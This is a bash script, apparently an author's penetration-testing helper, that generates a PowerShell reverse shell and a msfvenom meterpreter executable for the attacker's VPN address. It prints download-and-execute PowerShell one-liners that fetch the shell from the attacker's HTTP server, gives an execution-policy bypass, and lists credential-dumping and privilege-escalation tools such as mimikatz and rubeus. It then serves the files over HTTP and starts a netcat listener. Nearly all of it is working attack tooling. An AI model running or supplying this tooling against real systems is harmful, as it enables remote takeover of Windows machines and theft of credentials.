#!/bin/bash
# coding:UTF-8

# -------------------------------------------------------------------------------------
#                                WINDOWS HTTP SERVER
#                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)
# -------------------------------------------------------------------------------------

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Create two universal system files - payload.exe and reverseshell.ps1
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

filename="file.txt"
ifconfig tun0 | grep 'inet ' | awk '{print $2}' | sed 's/addr://' > $filename

cp template.txt reverseshell.ps1

while read line
  do 
  echo "Invoke-PowerShellTcp -Reverse -IPAddress $line -Port 1234" >> ./reverseshell.ps1
  mv reverseshell.ps1 ./APT/reverseshell.ps1
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$line LPORT=1234 --platform windows -f exe -o ./APT/winpayload.exe
done < $filename

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Display my universal banner.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

clear
echo "\t\t__        _____ _   _ ____   _____        ______    _   _ _____ _____ ____    ____  _____ ______     _______ ____   "
echo "\t\t\ \      / /_ _| \ | |  _ \ / _ \ \      / / ___|  | | | |_   _|_   _|  _ \  / ___|| ____|  _ \ \   / / ____|  _ \  "
echo "\t\t \ \ /\ / / | ||  \| | | | | | | \ \ /\ / /\___ \  | |_| | | |   | | | |_) | \___ \|  _| | |_) \ \ / /|  _| | |_) | "
echo "\t\t  \ V  V /  | || |\  | |_| | |_| |\ V  V /  ___) | |  _  | | |   | | |  __/   ___) | |___|  _ < \ V / | |___|  _ <  "
echo "\t\t   \_/\_/  |___|_| \_|____/ \___/  \_/\_/  |____/  |_| |_| |_|   |_| |_|     |____/|_____|_| \_\ \_/  |_____|_| \_\ "
echo "\t\t                                                                                                                    "
echo "\t\t                                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)                               \n"

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                             
# Details : Start the HTTP Serever.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

echo "Startup Instructions:\n"
echo "Get-ExecutionPolicy -List"
echo "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted\n"

while read line
  do 
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:80/APT/reverseshell.ps1)'\""
  echo "powershell \"iwr -Uri http://$line:80/APT/filename\" -outfile filename"
done < $filename

echo "\nENUMERATION			SHELLS				RUNNING PROCESSES		COMMUNICATIONS			CORE EXPLOITS		"
echo "----------------------------------------------------------------------------------------------------------------------------------------------------------"
echo "jawsenum.ps1			winpayload.exe			powerup.ps1			nc64.exe			mimidump.ps1            "
echo "sharphound.ps1			webshell.php			powercat.ps			plink64.exe			mimikatz.ps1		"
echo "sharphound.exe			myshell.php			powerview.ps1			chisel64.exe			winpwn.ps1		"
echo "winpeas32.exe			image.php.jpg			powermad.ps1							lovelypotato.ps1	"
echo "winpeas64.exe							procdump32.exe							mimikatz64.exe		"
echo "rubeus.exe							procdump64.exe							mimikatz32.exe		"
echo "nmapsetup.exe																		"
echo "----------------------------------------------------------------------------------------------------------------------------------------------------------"

exec python3 -m http.server 80 > output.txt &
exec rlwrap nc -lnvp 9001

#Eof
